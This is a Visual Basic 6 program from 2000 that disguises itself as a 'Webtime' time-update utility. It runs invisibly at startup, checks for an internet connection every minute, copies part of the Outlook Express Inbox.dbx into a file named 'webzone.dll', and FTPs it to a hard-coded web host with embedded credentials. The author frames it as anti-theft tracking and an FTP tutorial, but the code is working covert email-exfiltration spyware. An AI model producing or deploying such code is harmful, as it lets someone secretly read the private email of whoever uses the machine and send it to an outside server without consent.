VERSION 5.00
Object = "{48E59290-9880-11CF-9754-00AA00C00908}#1.0#0"; "MSINET.OCX"
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form main 
   BackColor       =   &H8000000A&
   BorderStyle     =   0  'None
   Caption         =   "Webtime"
   ClientHeight    =   630
   ClientLeft      =   3345
   ClientTop       =   1575
   ClientWidth     =   1905
   LinkTopic       =   "Form1"
   ScaleHeight     =   630
   ScaleWidth      =   1905
   ShowInTaskbar   =   0   'False
   Visible         =   0   'False
   Begin VB.Timer Timer1 
      Interval        =   60000
      Left            =   1320
      Top             =   0
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   720
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin InetCtlsObjects.Inet Inet1 
      Left            =   0
      Top             =   0
      _ExtentX        =   1005
      _ExtentY        =   1005
      _Version        =   393216
      AccessType      =   1
      Protocol        =   2
      RemotePort      =   21
      URL             =   "ftp://"
   End
   Begin VB.Label Label1 
      BackColor       =   &H8000000A&
      Caption         =   " "
      Height          =   135
      Index           =   6
      Left            =   3480
      TabIndex        =   6
      Top             =   4920
      Width           =   135
   End
   Begin VB.Label Label1 
      BackColor       =   &H8000000A&
      Caption         =   " "
      Height          =   135
      Index           =   5
      Left            =   3240
      TabIndex        =   5
      Top             =   4920
      Width           =   135
   End
   Begin VB.Label Label1 
      BackColor       =   &H8000000A&
      Caption         =   " "
      Height          =   135
      Index           =   4
      Left            =   3000
      TabIndex        =   4
      Top             =   4920
      Width           =   135
   End
   Begin VB.Label Label1 
      BackColor       =   &H8000000A&
      Caption         =   " "
      Height          =   135
      Index           =   3
      Left            =   2760
      TabIndex        =   3
      Top             =   4920
      Width           =   135
   End
   Begin VB.Label Label1 
      BackColor       =   &H8000000A&
      Caption         =   " "
      Height          =   135
      Index           =   2
      Left            =   2520
      TabIndex        =   2
      Top             =   4920
      Width           =   135
   End
   Begin VB.Label Label1 
      BackColor       =   &H8000000A&
      Caption         =   " "
      Height          =   135
      Index           =   1
      Left            =   2280
      TabIndex        =   1
      Top             =   4920
      Width           =   135
   End
   Begin VB.Label Label1 
      BackColor       =   &H8000000A&
      Caption         =   " "
      Height          =   135
      Index           =   0
      Left            =   2040
      TabIndex        =   0
      Top             =   4920
      Width           =   135
   End
End
Attribute VB_Name = "main"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'     Webzone Loader
'
'     By:  Max Seim
'          mlseim@mmm.com
'          March 23, 2000
'
'     This program is disguised as a rather boring program
'     that gets updated webtime from the internet.  It doesn't
'     do that, as you will find out ...
'
'     If your laptop (or pc) is ever stolen, hopefully the
'     thief will only change the dial-up connection and use
'     the PC to access the internet.  After he/she uses the internet
'     for a while, you will begin to see the INBOX of the thief's
'     email ... it will also contain his/her email address.  You
'     may be able to identify the person (person's email) and
'     recover your PC.  This may be the only chance you get!
'
'     Put the program in your STARTUP menu so that is executes
'     when your PC is booted.
'
'     The program will check for an internet connection every
'     1 minute.  When a connection occurs, the program will
'     do the following:
'
'     1) Open a file (Outlook Express Inbox.dbx file)
'     2) FTP the file to your personal webspace on the internet.
'        Your personal webspace provider must allow FTP transfers!
'     3) End itself ... it will be off until the next boot-up.
'     4) You can then access your webspace and use Notepad to
'        view the INBOX of the thief.
'
'     You won't notice the program running, unless you look at
'     the task manager.  It can be totally hidden using code
'     that can be found on Planet-Source-Code.
'
'     THE MAIN PURPOSE OF THIS PROGRAM ...
'     ----------------------------------------------------------------
'     This program is a good example of how to FTP a file from
'     your hard drive to your webspace drive.  It also shows you
'     how to detect an active internet connection.
'
'     If your PC is ever stolen, and you are able to capture the
'     email address of the thief, let me know.  I won't know if it
'     works until my PC is stolen ... which I hope will never happen.
'
Dim filename As String
Dim conn As String
Dim inline As String
Dim lines As Integer
Dim q As Integer
Dim y As Integer
Dim x As Integer
Dim pswd As String
Private Sub Timer1_Timer()
' The 1 minute timer for checking the internet connection
' This checks to see if the PC is connected to the internet
conn = IsNetConnectOnline()
If conn = "True" Then
Call sendit
End If
End Sub
Private Sub Form_Load()
Timer1.Enabled = True
' This is the file you want to capture - READ IN FROM THE .INI FILE
' I chose Internet Explorer - Outlook Express Inbox.dbx
Open "c:\webzone\webzone.ini" For Input As 1
Input #1, filename
Input #1, lines
Close
' This is the text file created that will be sent to your webspace.
' it's really a text file that is made to look like a .dll file
' I only wanted a portion of the Inbox.dbx file.  You can put a filename
' on the .Execute command line in the sendit() sub instead of doing this.
' Fiberia webspace provider only allows 100K max. filesize.

' I'm reading in the file and sending it to webzone.dll as text.
Open "webzone.dll" For Output As 2
Open filename For Input As 1
For x = 1 To lines
If EOF(1) Then
GoTo 100
End If
Input #1, inline
Print #2, inline
Next x
100 '
Close
End Sub
Private Sub sendit()
On Error GoTo 200
Timer1.Enabled = False
With Inet1
'
' This is where you enter your personal webspace FTP access data.
' URL = your webspace name  (example:  "home.fiberia.com")
' UserName = your username  (example:  "rocketman")
' Password = your password  (example:  "hUhtRe")
'
.URL = "home.fiberia.com"
.UserName = "rocketman"
.Password = "hUhtRe"
.Execute , "put webzone.dll webzone.txt"
End With
Call delay
Call closer
Exit Sub
200 '
Call endit
End Sub
Private Sub closer()
' This closes out the FTP transfer - puts in a delay in the event
' that your webspace provider takes a few seconds to disconnect.
On Error GoTo 300
With Inet1
.Execute , "CLOSE"
End With
Close
Kill "webzone.dll"
End
Exit Sub
300 '
Call endit
End Sub
Private Sub delay()
' This is the delay for the closer() subroutine
' Gives the webspace provider time to disconnect with
' getting a nuisance error.
On Error Resume Next
current = Timer
Do While Timer - current < 6
DoEvents
Loop
End Sub
Private Sub endit()
End
End Sub


